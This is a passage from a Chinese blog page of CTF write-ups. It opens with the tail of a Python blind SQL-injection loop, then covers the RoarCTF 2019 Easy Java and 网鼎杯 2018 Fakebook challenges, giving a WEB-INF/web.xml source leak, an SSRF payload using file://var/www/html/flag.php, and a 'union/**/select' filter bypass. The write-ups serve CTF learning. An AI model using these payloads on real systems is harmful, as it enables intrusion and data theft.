        while(quest.status_code != 200):
            quest=requests.post(url,data)
        if &quot;glzjin&quot; in quest.text:
            print (chr(i+1),end=&quot;&quot;)
            break
</code></pre>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>点击help发现是文件下载，而且是java开发，把请求改成post(这里好像只能过猜)下载<code>WEB-INF/web.xml</code>造成源码泄露<br><img src="https://i0.hdslb.com/bfs/article/389f8bd3f3d9ba4fef6d428754519b55290349942.png"></p>
<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>扫目录发现&#x2F;robots.txt<br>发现备份文件</p>
<pre><code>有一个UserInfo的类,类中有三个公共的类变量：name,age,blog。一个构造方法，一个get方法。主要的工作应该是建立会话，

然后判断是否是有效的请求，如果不是则返回404，如果不是则返回url的内容，一个getBlogContents方法，返回一个url的内容

还有一个isValidBlog验证这是否是一个有效的blog地址，看大佬博客说，这段正则好像url中有.就可以匹配。

get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点思路了，而我们在御剑扫到了flag.php。猜测可能flag.php处于内网，

如果用ssrf访问flag.php，可以用伪协议`file://var/www/html/flag.php`访问。
</code></pre>
<p>后面就是正常的sql注入，数字型的，<code>union</code>被过滤了,绕过方法是<code>union/**/select</code></p>
<p>爆破出来是序列化字符串，把网页改成<code>file://var/www/html/flag.php</code>也可得到flag.php</p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="/img/custom/donate/AliPayQR.jpg"></li>
                <li class="wechat-code"><img src="https://article.biliimg.com/bfs/article/7d28e37291e0dfa4a0ae4edf2a08e6b6290349942.png"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/posts/d16073cf.html" rel="prev">
              <div class="background">
                <img class="lazyload" src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://i0.hdslb.com/bfs/article/10298f27b6390efb7add3dcd2b72e49a290349942.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://i0.hdslb.com/bfs/article/10298f27b6390efb7add3dcd2b72e49a290349942.png">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                源码泄露</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/posts/da9d76f1.html" rel="next">
              <div class="background">
                <img class="lazyload" src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://i0.hdslb.com/bfs/article/5dedaf8b81f6bf24629d130a1e8af5b5290349942.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://i0.hdslb.com/bfs/article/5dedaf8b81f6bf24629d130a1e8af5b5290349942.png">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                ctf-ssti-labs</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <a href="https://qiuyuyang.top/" class="profile gravatar"><img src="https://article.biliimg.com/bfs/article/b4144522e96608adb59936edcda4bb4a290349942.png" itemprop="image" alt="秋雨样" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="https://qiuyuyang.top/" itemprop="url" rel="author">秋雨样</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2024 qiuyuyang<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      qiuyuyang<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
      <p style="color: #666666;">&copy 2020-2024</p>
    </div>
  </div><!-- .site-info -->
  </footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://jsd.onmicrosoft.cn/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//jsd.onmicrosoft.cn/npm/leancloud-storage@3.13.2/dist/av-min.js"></script>
<script src='//unpkg.com/valine@1.5.1/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="https://article.biliimg.com/bfs/article/b4144522e96608adb59936edcda4bb4a290349942.png">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">想玩电脑のQYY</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/qiuyuyang910" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="https://weibo.com/5884245708/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
      
        <a href="https://qm.qq.com/cgi-bin/qm/qr?k=9nJRtJfmxyIIc5kYw-DbP2gxXMq9gllE" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/%E6%8A%80%E6%9C%AF/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/%E7%94%9F%E6%B4%BB/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  生活
                </a>
              </li>
            
              <li>
                <a href="/categories/%E8%B5%84%E6%BA%90/">
                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
                  资源
                </a>
              </li>
            
              <li>
                <a href="/categories/%E9%9A%8F%E6%83%B3/">
                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
                  随想
                </a>
              </li>
            
              <li>
                <a href="/categories/%E8%BD%AC%E8%BD%BD/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  转载
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/tags/%E6%82%A6%E8%AF%BB/">
                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                  书单
                </a>
              </li>
            
              <li>
                <a href="/bangumi/">
                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                  番组
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/%E5%9B%BE%E9%9B%86/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
              <li>
                <a href="/lab/">
                  <i class="fa fa-cogs" aria-hidden="true"></i>
                  Lab
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019-2024 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/aplayer/dist/APlayer.min.css">
<script src="https://jsd.onmicrosoft.cn/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://jsd.onmicrosoft.cn/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="2426530028"

    server="netease"

    type="playlist"

    fixed="true"

    mini="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.5"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>